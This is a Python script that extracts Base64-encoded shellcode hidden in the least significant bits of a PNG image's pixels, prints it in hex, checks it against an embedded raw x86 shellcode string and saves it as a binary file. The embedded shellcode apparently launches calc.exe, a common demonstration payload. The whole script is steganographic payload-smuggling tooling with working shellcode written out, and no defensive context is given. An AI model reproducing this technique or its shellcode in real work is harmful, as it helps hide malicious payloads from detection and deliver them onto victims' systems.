from PIL import Image
import base64

real_hex_value = "fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6a018d85b20000005068318b6f87ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd563616c632e65786500"


def extract_payload_from_lsb(image_path: str, byte_length: int) -> bytes:
    img = Image.open(image_path)
    pixels = img.load()
    width, height = img.size

    bits = ''
    needed_bits = byte_length * 8

    for y in range(height):
        for x in range(width):
            if len(bits) >= needed_bits:
                break
            r, g, b = pixels[x, y]
            bits += str(r & 1)
        if len(bits) >= needed_bits:
            break

    # Convert bits to bytes
    return bytes(int(bits[i:i + 8], 2) for i in range(0, len(bits), 8))


# === USAGE ===
byte_length = 260  # Length of the Base64-encoded shellcode
b64_bytes = extract_payload_from_lsb("stego_output.png", byte_length)

# Decode Base64 to raw shellcode
try:
    shellcode = base64.b64decode(b64_bytes)
except Exception as e:
    print("❌ Failed to decode Base64:", e)
    exit(1)

# ✅ Print the shellcode in hex format
print("✅ Extracted shellcode (hex):")
print(shellcode.hex())
if shellcode.hex() == real_hex_value:
    print("✅ Shellcode matches the expected value!")

# Optional: Save it to a binary file
with open("extracted_shellcode.bin", "wb") as f:
    f.write(shellcode)
print("💾 Saved to extracted_shellcode.bin")
